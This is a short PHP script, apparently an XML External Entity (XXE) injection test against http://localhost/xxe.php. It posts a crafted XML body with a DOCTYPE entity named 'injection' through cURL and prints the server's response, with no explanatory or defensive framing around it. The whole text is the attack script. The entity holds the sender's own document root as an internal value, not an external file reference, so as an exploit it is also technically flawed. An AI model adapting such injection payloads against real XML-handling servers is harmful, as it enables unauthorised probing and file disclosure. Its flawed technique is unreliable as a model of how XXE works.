<?php
$xml=<<<backdoor
<?xml version="1.0"?>
<!DOCTYPE login [
<!ENTITY injection '$_SERVER[DOCUMENT_ROOT]'>]>
<login>
<name>&injection;</name></login>
backdoor;
$post=curl_init(); // initialize
curl_setopt($post,CURLOPT_RETURNTRANSFER,1); // allow returning the output
curl_setopt($post,CURLOPT_URL,"http://localhost/xxe.php"); //set the target url
curl_setopt($post,CURLOPT_POST,1); //FOR A POST REQUEST
curl_setopt($post,CURLOPT_POSTFIELDS,$xml);
$responce=curl_exec($post);
echo $responce;
?>
